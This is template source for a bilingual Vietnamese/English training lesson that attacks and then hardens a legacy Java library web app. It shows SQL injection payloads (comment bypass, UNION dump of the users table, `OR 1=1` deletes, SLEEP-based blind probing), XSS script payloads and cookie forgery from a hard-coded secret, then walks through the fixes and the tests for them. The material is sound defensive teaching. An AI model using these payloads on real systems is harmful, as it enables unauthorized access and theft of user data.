  : '<code>lab/loi-giai/ch6/tan-cong.sh</code> nạp lại dump gốc, đăng nhập bằng tài khoản thủ thư, rồi chạy từng đòn bằng <code>curl</code>. Mọi output dưới đây là trên code của Chương 5, chưa sửa gì.'}</p>

<h4>${en ? '1. Logging in as admin without the password' : '1. Vào tài khoản admin không cần mật khẩu'}</h4>
${O63_1}
<p>${en
  ? 'The servlet builds <code>SELECT * FROM users WHERE username = \'admin\' -- \' AND password = \'bat-ky\'</code>. Everything after <code>-- </code> is a comment in MySQL, so the password check disappears. The fix is not “filter quotes”; it is to stop building SQL from input.'
  : 'Servlet ghép thành <code>SELECT * FROM users WHERE username = \'admin\' -- \' AND password = \'bat-ky\'</code>. Mọi thứ sau <code>-- </code> là chú thích trong MySQL, nên phần kiểm mật khẩu biến mất. Cách sửa không phải "lọc dấu nháy"; mà là thôi ghép câu SQL từ dữ liệu người dùng.'}</p>

<h4>${en ? '2. Reading the users table through the search box' : '2. Đọc bảng users qua ô tìm kiếm'}</h4>
${O63_2}
<p>${en
  ? '<code>UNION SELECT</code> appends rows from another table to the search result; the attacker only has to match the column count (six, found by trial). The book list now shows usernames in the “code” column and passwords in the “title” column.'
  : '<code>UNION SELECT</code> nối thêm các dòng của bảng khác vào kết quả tìm kiếm; kẻ tấn công chỉ cần khớp số cột (sáu, thử vài lần là ra). Danh sách sách giờ hiện tên đăng nhập ở cột "mã" và mật khẩu ở cột "tên sách".'}</p>

<h4>${en ? '3–4. When the page shows nothing: error-based and time-based' : '3–4. Khi trang không hiện gì: dựa vào lỗi và dựa vào thời gian'}</h4>
${O63_34}
<p>${en
  ? 'The borrow form never displays data — but the servlet prints <code>e.getMessage()</code>, and MySQL helpfully puts the result of the sub-query into the XPath error. Even with errors hidden, <code>SLEEP(2)</code> turns every request into a yes/no question: “is the first character of admin’s password <em>a</em>?” — 2 seconds means yes. Automated tools (sqlmap) ask thousands of such questions per minute. This is the injection inside <code>PhieuMuonDAO</code> that Chapter 5 deliberately kept: ticket <strong>TV-102</strong>.'
  : 'Form mượn sách không bao giờ hiện dữ liệu — nhưng servlet in <code>e.getMessage()</code>, và MySQL "tốt bụng" đặt kết quả truy vấn con vào thông báo lỗi XPath. Dù có giấu lỗi đi nữa, <code>SLEEP(2)</code> biến mỗi request thành một câu hỏi có/không: "ký tự đầu của mật khẩu admin có phải <em>a</em>?" — mất 2 giây nghĩa là có. Công cụ tự động (sqlmap) hỏi hàng nghìn câu như thế mỗi phút. Đây chính là chỗ injection trong <code>PhieuMuonDAO</code> mà Chương 5 cố ý giữ lại: ticket <strong>TV-102</strong>.'}</p>

<h4>${en ? '5. The feature without a button' : '5. Chức năng không có nút'}</h4>
${O63_5}
<p>${en
  ? 'Lesson 6.1 found <code>xoaSach</code> with no UI. It concatenates the id: <code>0 OR 1=1</code> was blocked by the foreign key on loans (the whole DELETE fails atomically), so the attacker adds one clause — and 3 of 7 books vanish. Dead code for users, live code for attackers.'
  : 'Bài 6.1 tìm ra <code>xoaSach</code> không có giao diện. Nó nối chuỗi id: <code>0 OR 1=1</code> bị khoá ngoại của bảng loans chặn (cả câu DELETE thất bại nguyên khối), nên kẻ tấn công thêm một mệnh đề — và 3 trong 7 cuốn biến mất. Code chết với người dùng, code sống với kẻ tấn công.'}</p>

<h4>${en ? '6–7. XSS: reflected and stored' : '6–7. XSS: phản chiếu và lưu trữ'}</h4>
${O63_67}
<p>${en
  ? 'Scriptlet JSP prints <code>&lt;%= … %&gt;</code> without escaping. A link with <code>?msg=&lt;script&gt;…</code> sent to the librarian runs script in her session (reflected); a book title with an <code>onerror</code> handler runs for everyone who opens the list (stored). In October 2005 a stored XSS on MySpace (the “Samy” worm) added over a million friend requests in about 20 hours — the author was later sentenced to probation and community service.'
  : 'JSP kiểu scriptlet in <code>&lt;%= … %&gt;</code> mà không thoát. Một liên kết có <code>?msg=&lt;script&gt;…</code> gửi cho thủ thư sẽ chạy script trong phiên của chị ấy (phản chiếu); một tên sách có <code>onerror</code> chạy với mọi người mở danh sách (lưu trữ). Tháng 10/2005, một lỗi XSS lưu trữ trên MySpace (sâu "Samy") tạo hơn một triệu lời mời kết bạn trong khoảng 20 giờ — tác giả sau đó bị án quản chế và lao động công ích.'}</p>

<h4>${en ? '8–9. Secrets in source code, passwords in plain text' : '8–9. Bí mật trong mã nguồn, mật khẩu lưu thô'}</h4>
${O63_89}
<p>${en
  ? 'The “remember me” token is <code>MD5(username + "thuvien2016")</code> — the secret is in <code>TokenUtil.java</code>, so anyone who has ever seen the source can mint a cookie for <em>admin</em>. Note also that the cookie has no <code>HttpOnly</code> (JSESSIONID does), so attack 6 could steal it. And the passwords themselves sit in the table in plain text: any SQL injection, backup leak or curious DBA reads them all, and users re-use passwords elsewhere.'
  : 'Token "ghi nhớ đăng nhập" là <code>MD5(tên + "thuvien2016")</code> — bí mật nằm ngay trong <code>TokenUtil.java</code>, nên ai từng thấy mã nguồn là tạo được cookie cho <em>admin</em>. Để ý cookie này không có <code>HttpOnly</code> (JSESSIONID thì có), nên đòn 6 lấy được nó. Còn bản thân mật khẩu nằm thô trong bảng: một lỗi injection bất kỳ, một bản sao lưu bị lộ hay một DBA tò mò là đọc được tất cả, mà người dùng lại hay dùng chung mật khẩu ở nơi khác.'}</p>

<h3>${en ? 'These are not textbook risks' : 'Đây không phải rủi ro trên sách vở'}</h3>
<ul>
<li>${en ? '<strong>Heartland Payment Systems, 2008</strong> — SQL injection was the entry point of a breach of about 130 million card numbers; Albert Gonzalez was sentenced to 20 years in 2010.' : '<strong>Heartland Payment Systems, 2008</strong> — SQL injection là cửa vào của vụ lộ khoảng 130 triệu số thẻ; Albert Gonzalez bị kết án 20 năm tù năm 2010.'}</li>
<li>${en ? '<strong>TalkTalk, October 2015</strong> — SQL injection in three web pages of <em>legacy infrastructure inherited from Tiscali</em>; data of 156,959 customers. The UK ICO fined TalkTalk £400,000 (October 2016), noting the pages were outdated and the flaw had a fix available for years. Old code you did not write is still your responsibility.' : '<strong>TalkTalk, tháng 10/2015</strong> — SQL injection ở ba trang web thuộc <em>hạ tầng cũ thừa hưởng từ Tiscali</em>; lộ dữ liệu 156.959 khách hàng. ICO Anh phạt TalkTalk 400.000 bảng (tháng 10/2016), nêu rõ các trang đã lỗi thời và lỗi có cách sửa từ nhiều năm. Code cũ không phải bạn viết vẫn là trách nhiệm của bạn.'}</li>
<li>${en ? '<strong>RockYou, December 2009</strong> — SQL injection exposed 32 million passwords stored in plain text; the list is still a standard dictionary for password cracking.' : '<strong>RockYou, tháng 12/2009</strong> — SQL injection làm lộ 32 triệu mật khẩu lưu thô; danh sách đó tới nay vẫn là từ điển chuẩn để bẻ mật khẩu.'}</li>
<li>${en ? '<strong>LinkedIn, 2012</strong> — passwords hashed with unsalted SHA-1; about 6.5 million hashes leaked in 2012, and in 2016 the full set of ~117 million appeared for sale. A fast hash without salt is barely better than plain text.' : '<strong>LinkedIn, 2012</strong> — mật khẩu băm bằng SHA-1 không muối; khoảng 6,5 triệu bản băm lộ năm 2012, và năm 2016 cả bộ chừng 117 triệu bị rao bán. Hàm băm nhanh không muối chỉ hơn lưu thô một chút.'}</li>
</ul>

<h3>${en ? 'Fix 1 — TV-102: attack tests first, then PreparedStatement' : 'Sửa 1 — TV-102: test tấn công trước, rồi PreparedStatement'}</h3>
${C63_TEST102}
${O63_DO}
<p>${en
  ? 'Three red tests, each red for the right reason: the sleep really ran inside MySQL (1002 ms), the password really leaked, and the return form really found loan 1 for <code>0 OR 1=1</code> before crashing. A security test that was never red proves nothing. Then the fix: every DAO method takes <code>int</code> and binds it with <code>setInt</code>; the service converts user text to a number at the boundary and rejects anything else without touching the database.'
  : 'Ba test đỏ, cái nào cũng đỏ đúng lý do: lệnh sleep thật sự chạy trong MySQL (1002 ms), mật khẩu thật sự bị lộ, và form trả sách thật sự tìm thấy phiếu 1 với <code>0 OR 1=1</code> trước khi vỡ. Test bảo mật chưa từng đỏ thì không chứng minh được gì. Rồi tới bản sửa: mọi hàm DAO nhận <code>int</code> và gắn bằng <code>setInt</code>; service đổi chữ người dùng gõ thành số ở biên và từ chối mọi thứ khác mà không chạm CSDL.'}</p>
${O63_DIFF102}
${C63_SONGUYEN}
${O63_XANH}
<p>${en
  ? 'One existing characterization test had to change: <code>readerIdKhongPhaiSo</code> used to lock “Loi: Unknown column \'abc\' in \'where clause\'” — that message <em>was</em> the vulnerability, proof that the text was pasted into SQL. The test now expects “Mã độc giả không hợp lệ”, and the commit message says the change is intentional. This is the difference from Chapter 5: there, a red test meant “you broke something”; here, a test flips because the behaviour is the bug.'
  : 'Một characterization test cũ phải đổi: <code>readerIdKhongPhaiSo</code> từng khoá dòng "Loi: Unknown column \'abc\' in \'where clause\'" — chính dòng đó <em>là</em> lỗ hổng, bằng chứng chữ bị dán vào câu SQL. Test nay chờ "Mã độc giả không hợp lệ", và lời commit ghi rõ đổi có chủ đích. Đây là khác biệt với Chương 5: ở đó test đỏ nghĩa là "bạn làm vỡ gì đó"; ở đây test được lật vì chính hành vi là bug.'}</p>
<p>${en
  ? 'Why not “escape the quotes” or a blacklist of words? Because <code>2 AND SLEEP(2)</code> contains no quote at all, and every blacklist has been bypassed by encodings and comments. Parameters are sent to MySQL separately from the SQL text; there is no way for data to become syntax.'
  : 'Sao không "thoát dấu nháy" hay lập danh sách chữ cấm? Vì <code>2 AND SLEEP(2)</code> không có lấy một dấu nháy, và danh sách cấm nào cũng từng bị vượt bằng mã hoá hay chú thích. Tham số được gửi tới MySQL tách riêng khỏi câu SQL; dữ liệu không có cách nào biến thành cú pháp.'}</p>

<h3>${en ? 'Fix 2 — stop printing raw errors (CWE-209)' : 'Sửa 2 — thôi in lỗi thô ra trang (CWE-209)'}</h3>
${C63_LOI}
${O63_LOI_LOG}
<p>${en
  ? 'The user sees an 8-character code; support searches the log for it and finds the full stack trace. The test <code>bookIdKhongTonTai</code> flips too (it locked the raw driver message), again on purpose. The underlying bug — not checking <code>rs.next()</code> — is still there; it is now an internal error with a reference instead of a leak, and it gets its own ticket.'
  : 'Người dùng thấy một mã 8 ký tự; bộ phận hỗ trợ tìm mã đó trong log là ra cả stack trace. Test <code>bookIdKhongTonTai</code> cũng được lật (nó khoá thông báo thô của driver), lần nữa có chủ đích. Bug gốc — không kiểm <code>rs.next()</code> — vẫn còn đó; giờ nó là lỗi nội bộ có mã tra cứu thay vì một chỗ rò rỉ, và nó có ticket riêng.'}</p>

<h3>${en ? 'Fix 3 — escape output in JSP' : 'Sửa 3 — thoát dữ liệu khi in ra JSP'}</h3>
${C63_HTML}
${O63_JSP}
<p>${en
  ? 'Why a 20-line helper instead of the library already on the classpath? We measured:'
  : 'Sao lại viết hàm phụ 20 dòng trong khi classpath đã có thư viện? Ta đã đo:'}</p>
${O63_ESC}
<p>${en
  ? '<code>StringEscapeUtils.escapeHtml</code> from commons-lang 2.6 also converts every Vietnamese letter into an entity. The browser shows the same text, but the golden master of Chapter 3 would change on every page and the HTML grows. Escaping only the five significant characters keeps the golden master byte-identical — which is how we prove this security fix changed nothing visible. In new JSP code prefer JSTL <code>&lt;c:out&gt;</code> (it escapes by default; <code>report.jsp</code> already uses it) or Spring’s templates; in scriptlet code that you are not rewriting, a helper is the minimal fix.'
  : '<code>StringEscapeUtils.escapeHtml</code> của commons-lang 2.6 đổi luôn mọi chữ Việt có dấu thành thực thể. Trình duyệt vẫn hiện đúng, nhưng golden master của Chương 3 sẽ đổi ở mọi trang và HTML nặng thêm. Chỉ thoát năm ký tự có nghĩa thì golden master giống hệt từng byte — đó là cách ta chứng minh bản sửa bảo mật này không đổi gì người dùng nhìn thấy. Với JSP mới, dùng JSTL <code>&lt;c:out&gt;</code> (mặc định đã thoát; <code>report.jsp</code> đang dùng) hoặc template của Spring; với code scriptlet bạn không viết lại, hàm phụ là bản sửa tối thiểu.'}</p>

<h3>${en ? 'Fix 4 — TV-105: login, and a surprise the tests found' : 'Sửa 4 — TV-105: đăng nhập, và một bất ngờ do test tìm ra'}</h3>
<p>${en
  ? 'Before touching <code>LoginServlet.doPost</code> we characterize it. Writing those tests exposed a behaviour nobody had documented:'
  : 'Trước khi đụng <code>LoginServlet.doPost</code>, ta viết characterization test cho nó. Viết test làm lộ ra một hành vi chưa ai ghi lại:'}</p>
${O63_CI}
<p>${en
  ? 'Because MySQL compared the password with the column’s case-insensitive collation (<code>utf8_general_ci</code>) and PAD SPACE rules, <code>ADMIN123</code> and <code>admin123</code> followed by spaces both worked. Fixing the injection by comparing in Java will change this — users who typed their password in capitals for years will suddenly fail. That is a behaviour change to announce, not to discover in production.'
  : 'Vì MySQL so mật khẩu theo collation không phân biệt hoa/thường của cột (<code>utf8_general_ci</code>) và quy tắc PAD SPACE, cả <code>ADMIN123</code> lẫn <code>admin123</code> kèm dấu cách đều vào được. Sửa injection bằng cách so trong Java sẽ làm đổi điều này — ai gõ mật khẩu bằng chữ hoa suốt mấy năm sẽ bỗng nhiên không vào được. Đó là thay đổi hành vi cần báo trước, không phải để phát hiện trên production.'}</p>
${C63_MATKHAU}
${O63_LOGIN}
<p>${en
  ? 'Design choices, each for a reason: PBKDF2 because it ships with JDK 8 — no new dependency in a project whose customer approves every jar (bcrypt or Argon2 are fine choices too; Spring’s <code>BCryptPasswordEncoder</code> is lesson 9.2 of the Spring Boot course). A prefix with algorithm and rounds so the next upgrade is possible without guessing. <code>MessageDigest.isEqual</code> instead of <code>equals</code>, so comparison time does not depend on how many leading bytes match.'
  : 'Mỗi lựa chọn có lý do: PBKDF2 vì có sẵn trong JDK 8 — không thêm thư viện vào một dự án mà khách duyệt từng jar (bcrypt hay Argon2 cũng là lựa chọn tốt; <code>BCryptPasswordEncoder</code> của Spring ở bài 9.2 khoá Spring Boot). Tiền tố ghi thuật toán và số vòng để lần nâng sau không phải đoán. <code>MessageDigest.isEqual</code> thay vì <code>equals</code>, để thời gian so không phụ thuộc vào số byte đầu trùng nhau.'}</p>

<h4>${en ? 'Migrating stored passwords: three steps, in order' : 'Chuyển mật khẩu đang lưu: ba bước, đúng thứ tự'}</h4>
<ol>
<li>${en ? '<strong>Widen the column first</strong> (<code>db/migrations/V6_3__mat_khau_bam.sql</code>: <code>VARCHAR(255)</code>). A hash is 87 characters; the old column holds 50.' : '<strong>Nới cột trước</strong> (<code>db/migrations/V6_3__mat_khau_bam.sql</code>: <code>VARCHAR(255)</code>). Bản băm dài 87 ký tự; cột cũ chứa 50.'}</li>
<li>${en ? '<strong>Deploy the new login</strong>: it accepts both forms and re-hashes on a successful login (gradual upgrade).' : '<strong>Triển khai bản đăng nhập mới</strong>: chấp nhận cả hai dạng và băm lại khi đăng nhập đúng (nâng cấp dần).'}</li>
<li>${en ? '<strong>Hash the rest in one pass</strong> (<code>tools/BamMatKhauCu</code>). Gradual upgrade alone leaves plain text forever for accounts that never log in again — and those are exactly the accounts whose passwords get dumped.' : '<strong>Băm phần còn lại một lượt</strong> (<code>tools/BamMatKhauCu</code>). Chỉ nâng cấp dần thì tài khoản không bao giờ đăng nhập lại sẽ nằm thô mãi — mà đó lại đúng là những tài khoản bị lôi ra khi lộ dữ liệu.'}</li>
</ol>
${O63_BAM}
<p>${en
  ? 'What happens if someone deploys step 2 and forgets step 1? We tried: login still works (the re-hash failure is caught and logged — a side effect must never block the main action), but every login pays the hashing cost and the warning repeats until someone reads the log:'
  : 'Nếu ai đó triển khai bước 2 mà quên bước 1 thì sao? Ta đã thử: vẫn đăng nhập được (lỗi băm lại được bắt và ghi log — một tác dụng phụ không bao giờ được chặn việc chính), nhưng lần đăng nhập nào cũng tốn công băm và dòng cảnh báo lặp lại cho tới khi có người đọc log:'}</p>
${O63_WARN}
<h4>${en ? 'The cost of a slow hash — and a new leak' : 'Cái giá của hàm băm chậm — và một chỗ rò mới'}</h4>
${O63_TG}
<p>${en
  ? 'About 0.7 s per login on this machine’s JDK 8 — slow on purpose (an attacker who steals the table pays the same per guess). But look at the last line: an unknown username returns in 3 ms, a known one in 0.7 s. Anyone can now test which usernames exist. The standard fix is to run one dummy hash when the user is not found, so both paths cost the same — it is the extra challenge of lab 6.4. Every security fix deserves a second look for the leak it creates.'
  : 'Khoảng 0,7 giây mỗi lần đăng nhập trên JDK 8 của máy này — chậm có chủ đích (kẻ trộm được bảng cũng tốn chừng đó cho mỗi lần đoán). Nhưng nhìn dòng cuối: tên không tồn tại trả lời sau 3 ms, tên có thật sau 0,7 giây. Giờ ai cũng thử được tên đăng nhập nào tồn tại. Cách sửa chuẩn là băm một mật khẩu giả khi không tìm thấy người dùng, để hai nhánh tốn như nhau — đó là thử thách thêm của lab 6.4. Bản sửa bảo mật nào cũng đáng được nhìn lại lần hai để tìm chỗ rò nó vừa tạo ra.'}</p>

<h3>${en ? 'The same nine attacks, after the fixes' : 'Chín đòn cũ, sau khi sửa'}</h3>
<p>${en
  ? 'After this lesson’s commits and the lab’s (lesson 6.4), <code>tan-cong.sh</code> was run again. Differences only:'
  : 'Sau các commit của bài này và của lab (bài 6.4), <code>tan-cong.sh</code> được chạy lại. Chỉ ghi chỗ khác:'}</p>
<table>
<tr><th>#</th><th>${en ? 'Before' : 'Trước'}</th><th>${en ? 'After' : 'Sau'}</th></tr>
<tr><td>1</td><td>302 → books</td><td>200 ${en ? '(login page again)' : '(lại trang đăng nhập)'}</td></tr>
<tr><td>2</td><td>${en ? 'usernames and passwords in the table' : 'tên và mật khẩu hiện trong bảng'}</td><td>${en ? 'empty result' : 'kết quả rỗng'}</td></tr>
<tr><td>3</td><td><code>XPATH syntax error: '~admin123'</code></td><td>${en ? 'redirect' : 'chuyển trang'} <code>books?msg=Mã độc giả không hợp lệ</code></td></tr>
<tr><td>4</td><td>a: 2.003 s · d: 0.004 s</td><td>a: 0.003 s · d: 0.003 s</td></tr>
<tr><td>5</td><td>${en ? '4 books left' : 'còn 4 cuốn'}</td><td>200 “Action khong hop le: delete”, ${en ? '7 books' : '7 cuốn'}</td></tr>
<tr><td>6–7</td><td><code>&lt;script&gt;</code>, <code>&lt;img onerror&gt;</code></td><td><code>&amp;lt;script&amp;gt;</code>, <code>&amp;lt;img … &amp;gt;</code></td></tr>
<tr><td>8</td><td>${en ? 'forged cookie logs in as admin' : 'cookie giả vào được admin'}</td><td><strong>${en ? 'unchanged — TV-96, Chapter 8' : 'không đổi — TV-96, Chương 8'}</strong></td></tr>
<tr><td>9</td><td><code>admin123</code>, <code>123456</code></td><td><strong>${en ? 'unchanged until the migration + one-pass hashing are run on the data' : 'không đổi cho tới khi chạy migration + băm một lượt trên dữ liệu'}</strong></td></tr>
</table>
<p>${en
  ? 'Rows 8 and 9 are the honest part of a security report. Code fixes do not fix data already stored, and a known remaining issue goes into the PR description with its ticket number rather than being silently left out.'
  : 'Dòng 8 và 9 là phần trung thực của một báo cáo bảo mật. Sửa code không sửa được dữ liệu đã lưu, và vấn đề còn lại đã biết phải ghi vào mô tả PR kèm số ticket, chứ không lặng lẽ bỏ qua.'}</p>

<h3>💼 ${en ? 'OJT situation: you found a hole nobody asked about' : 'Tình huống OJT: bạn thấy một lỗ hổng không ai giao'}</h3>
<p>${en
  ? 'You are fixing a date format and notice the login query is concatenated. Do not fix it inside the date-format PR, do not post it in the project’s public chat, and do not test it on the customer’s production. Tell your lead privately, with a one-paragraph description and the line number; the lead decides how the customer is informed (many contracts have a clause on security findings). Then it becomes a ticket like TV-105 with its own tests, its own PR and its own review.'
  : 'Bạn đang sửa định dạng ngày thì thấy câu đăng nhập nối chuỗi. Đừng sửa lẫn vào PR định dạng ngày, đừng đăng lên nhóm chat chung của dự án, và đừng thử trên production của khách. Báo riêng trưởng nhóm, kèm một đoạn mô tả và số dòng; trưởng nhóm quyết định báo khách thế nào (nhiều hợp đồng có điều khoản về phát hiện bảo mật). Rồi nó thành một ticket như TV-105, có test riêng, PR riêng và review riêng.'}</p>

<h3>🎤 ${en ? 'What the interviewer will ask' : 'Phỏng vấn viên sẽ hỏi'}</h3>
<ol>
<li><strong>${en ? '“How does a PreparedStatement prevent SQL injection?”' : '"PreparedStatement chống SQL injection thế nào?"'}</strong><br>${en
  ? 'The SQL text with placeholders and the parameter values travel separately; the database parses the statement before seeing the data, so data can never change the syntax. It does not help if you concatenate into the SQL string anyway, or for identifiers like column names in ORDER BY — those need an allow-list.'
  : 'Câu SQL có dấu ? và giá trị tham số được gửi riêng; CSDL phân tích câu lệnh trước khi thấy dữ liệu, nên dữ liệu không bao giờ đổi được cú pháp. Nó vô dụng nếu bạn vẫn nối chuỗi vào câu SQL, và với tên định danh như tên cột trong ORDER BY — chỗ đó cần danh sách cho phép.'}</li>
<li><strong>${en ? '“How do you migrate plaintext passwords without forcing a reset?”' : '"Chuyển mật khẩu thô sang băm mà không bắt đặt lại thế nào?"'}</strong><br>${en
  ? 'Widen the column, deploy code that verifies both forms and re-hashes on login, then hash every remaining plaintext in one pass — we hold the plaintext, so we can. With an old fast hash (MD5, SHA-1) you can instead wrap it: store slowHash(oldHash).'
  : 'Nới cột, triển khai code kiểm được cả hai dạng và băm lại khi đăng nhập, rồi băm một lượt mọi mật khẩu còn thô — ta đang giữ bản thô nên làm được. Với hàm băm nhanh đời cũ (MD5, SHA-1) thì bọc lại: lưu hamBamCham(banBamCu).'}</li>
<li><strong>${en ? '“Stored vs reflected XSS?”' : '"XSS lưu trữ khác phản chiếu thế nào?"'}</strong><br>${en
  ? 'Reflected: the payload is in the request (a link) and only hits whoever opens it. Stored: it is saved (a book title) and hits everyone who views the page. Both are fixed by context-aware output escaping; CSP and HttpOnly cookies reduce the damage.'
  : 'Phản chiếu: mã độc nằm trong request (một liên kết) và chỉ trúng người mở nó. Lưu trữ: nó được lưu lại (một tên sách) và trúng mọi người xem trang. Cả hai sửa bằng thoát dữ liệu đúng ngữ cảnh khi in ra; CSP và cookie HttpOnly giảm thiệt hại.'}</li>
<li><strong>${en ? '“You fixed the injection. A test now fails. Is that bad?”' : '"Em sửa injection xong thì một test đỏ. Vậy có tệ không?"'}</strong><br>${en
  ? 'Read what it locked. Here it locked a raw SQL error message — the vulnerability itself. I flip it deliberately, say so in the commit, and tell the customer if users could notice (the login became case-sensitive).'
  : 'Đọc xem nó khoá cái gì. Ở đây nó khoá thông báo lỗi SQL thô — chính là lỗ hổng. Em lật nó có chủ đích, ghi rõ trong commit, và báo khách nếu người dùng có thể nhận ra (đăng nhập giờ phân biệt hoa/thường).'}</li>
</ol>

<h3>🗂 ${en ? 'Key terms' : 'Thuật ngữ trong bài'}</h3>
${thuatNgu(en, [
  ['SQL injection', 'chèn SQL', 'Dữ liệu người dùng trở thành một phần câu SQL vì bị nối chuỗi.', 'User data becoming part of the SQL statement through concatenation.'],
  ['Blind / time-based', 'dò mù theo thời gian', 'Trang không hiện gì, kẻ tấn công hỏi có/không qua độ trễ SLEEP.', 'No visible output; the attacker asks yes/no questions through SLEEP delays.'],
  ['CWE-209', 'lộ thông tin qua lỗi', 'Thông báo lỗi chứa chi tiết nội bộ hoặc dữ liệu.', 'Error messages that reveal internals or data.'],
  ['XSS', 'chèn script', 'Dữ liệu không được thoát khi in ra HTML nên trình duyệt chạy nó như mã.', 'Unescaped output that the browser runs as code.'],
  ['PBKDF2', 'hàm dẫn khoá chậm', 'Băm lặp nhiều vòng có muối; có sẵn trong JDK.', 'A salted, many-round key derivation; built into the JDK.'],
  ['Salt', 'muối', 'Chuỗi ngẫu nhiên riêng cho từng mật khẩu, để cùng mật khẩu ra bản băm khác nhau.', 'A random per-password value so equal passwords hash differently.'],
  ['User enumeration', 'dò tên người dùng', 'Biết tên nào tồn tại qua thông báo hoặc thời gian phản hồi khác nhau.', 'Learning which usernames exist from different messages or timings.'],
])}

<h3>📌 ${en ? 'Summary' : 'Tóm tắt'}</h3>
<ul>
<li>${en ? 'Attack your own lab first; a security test that was never red proves nothing.' : 'Tấn công lab của mình trước; test bảo mật chưa từng đỏ thì không chứng minh gì.'}</li>
<li>${en ? 'Parameters for data, allow-lists for identifiers, escaping for output, slow salted hashes for passwords.' : 'Tham số cho dữ liệu, danh sách cho phép cho tên định danh, thoát khi in ra, hàm băm chậm có muối cho mật khẩu.'}</li>
<li>${en ? 'Security fixes change behaviour on purpose: flip the tests that locked the bug, announce what users will notice.' : 'Sửa bảo mật là đổi hành vi có chủ đích: lật các test đã khoá bug, báo trước điều người dùng sẽ nhận ra.'}</li>
<li>${en ? 'Fixing code does not fix stored data; report what remains with a ticket number.' : 'Sửa code không sửa dữ liệu đã lưu; báo cáo phần còn lại kèm số ticket.'}</li>
</ul>
${lk(bai('spring-boot', 'sb-10-3-injection-jpql'), '🍃', en ? 'Spring Boot 10.3 — Injection in JPQL and native queries' : 'Spring Boot 10.3 — Injection trong JPQL và native query', en ? 'the same bug, one framework later' : 'cùng lỗi đó, ở framework đời sau')}
${lk(bai('authentication', 'auth-2-5-chuyen-doi'), '🔑', en ? 'Authentication 2.5 — Moving off an old hash without resets' : 'Xác thực 2.5 — Chuyển khỏi hàm băm cũ, không bắt đặt lại mật khẩu', en ? 'wrapping MD5/SHA-1, measuring costs' : 'bọc MD5/SHA-1, đo chi phí')}
${lk(bai('nodejs', 'nodejs-9-2-xss-va-sanitize'), '🧪', en ? 'Node.js 9.2 — XSS: from a stranger’s note to your session' : 'Node.js 9.2 — XSS: từ ghi chú của người lạ tới phiên đăng nhập của bạn', en ? 'the Node side, with CSP' : 'phía Node, có CSP')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html', '📘', 'OWASP — Password Storage Cheat Sheet', en ? 'algorithms and work factors' : 'thuật toán và số vòng')}
`);

/* ═══════════════════ 6.4 — Lab ═══════════════════ */
const O64_DO = out(`
$ mvn -B -o test | grep '^\\[ERROR\\]'      # (trích) 5 test mới của lab, chạy trên code CHƯA sửa
[ERROR] com.thuvien.servlet.TimKiemVaDocGiaTest.xoaDocGiaBangChuoiSQL_khongXoaHet_lab64 -- Time elapsed: 0.173 s <<< FAILURE!
[ERROR] com.thuvien.servlet.TimKiemVaDocGiaTest.timKiemUnion_khongLoBangUsers_lab64 -- Time elapsed: 0.088 s <<< FAILURE!
[ERROR] com.thuvien.servlet.TimKiemVaDocGiaTest.themDocGiaTenCoDauNhay_duocLuu_lab64 -- Time elapsed: 0.146 s <<< FAILURE!
[ERROR]   TimKiemVaDocGiaTest.themDocGiaTenCoDauNhay_duocLuu_lab64:69 expected: <1> but was: <0>
[ERROR]   TimKiemVaDocGiaTest.timKiemUnion_khongLoBangUsers_lab64:53 expected: <[]> but was: <[admin123, pbkdf2-sha256$600000$8BJ673xl7eZiVVixnpzhKg$mZBeZLcUn0yTOhhB3bUUZ4JTjARU8qxwJZkfPggxlK4]>
[ERROR]   TimKiemVaDocGiaTest.xoaDocGiaBangChuoiSQL_khongXoaHet_lab64:77 expected: <5> but was: <0>
[ERROR] Tests run: 49, Failures: 3, Errors: 0, Skipped: 0
`);
const C64_TEST = java(`
// TimKiemVaDocGiaTest (trích) — ba test tấn công + hai test giữ hành vi cũ
@Test
void timTheoTen_vanNhuCu() throws Exception {
    assertEquals("[Lập trình Java căn bản]", timSach("java").toString());
}

@Test
void timKiemUnion_khongLoBangUsers_lab64() throws Exception {
    assertEquals("[]", timSach("zzz' UNION SELECT id, username, password, role, 0, 0 FROM users -- ").toString());
}

@Test
void themDocGiaTenCoDauNhay_duocLuu_lab64() throws Exception {
    when(req.getParameter("action")).thenReturn("add");
    when(req.getParameter("name")).thenReturn("Mary O'Brien");
    when(req.getParameter("type")).thenReturn("KHACH");
    when(req.getParameter("phone")).thenReturn("0909");
    new ReaderServlet().doPost(req, res);
    // code cũ: câu INSERT vỡ ở dấu nháy, lỗi bị nuốt ⇒ thủ thư thấy trang tải lại mà không có ai được thêm
    assertEquals(1, DuLieuTest.so("SELECT COUNT(*) FROM readers WHERE name = 'Mary O''Brien'"));
}

@Test
void xoaDocGiaBangChuoiSQL_khongXoaHet_lab64() throws Exception {
    when(req.getParameter("action")).thenReturn("delete");
    when(req.getParameter("id")).thenReturn("0 OR 1=1");
    new ReaderServlet().doPost(req, res);
    assertEquals(5, DuLieuTest.so("SELECT COUNT(*) FROM readers"));
}
`);
const O64_LOG = out(`
$ git log --oneline --reverse ch5..ch6
29c012e chore(6.1): xoa ExportServlet chet tu 2018 (TV-103)
6895344 chore(6.4): xoa BookDAO.findById, Constants.PAGE_SIZE/DATE_FORMAT (grep 0, JaCoCo 0)
34c3bd3 chore(6.4): go BookServlet.xoaSach — khong co nut tu 2016, noi chuoi SQL (TV-104, khach xac nhan)
868c7b9 fix(6.3): TV-102 SQL injection trong muon/tra — PreparedStatement + kiem ma la so
4109a10 fix(6.3): khong in loi tho ra trang (CWE-209) — log.error kem ma tra cuu 8 ky tu
c2c0e24 fix(6.3): thoat HTML o books.jsp (msg, q, ma/ten/tac gia) va thong bao action la — XSS phan chieu + luu tru
df285ba fix(6.3): TV-105 dang nhap — PreparedStatement + bam PBKDF2 (nang cap dan khi dang nhap)
a8f8703 feat(6.3): tools/BamMatKhauCu — bam mot luot moi mat khau con tho (chay sau migration V6_3)
94e0e97 fix(6.4): injection con lai — tim sach (UNION), them sach, them/xoa doc gia; thoat HTML readers.jsp + header.jsp
0a12664 chore(6.4): log4j 1.2.17 -> reload4j 1.2.27 (6 CVE; cung package org.apache.log4j, 0 dong ma doi)
4be74aa chore(6.4): mysql-connector-java 5.1.49 -> com.mysql:mysql-connector-j 9.7.0; db.driver com.mysql.cj.jdbc.Driver
62e0e46 chore(6.4): Connector/J 9.7.0 -> 26.10.0 — ODC bao 9.7.0 con 4 CVE (CPU thang 7/2026, anh huong 9.7.0-9.7.1)
`);
const O64_OFFLINE = out(`
$ mvn -B -o test                 # vừa đổi log4j → reload4j trong pom.xml
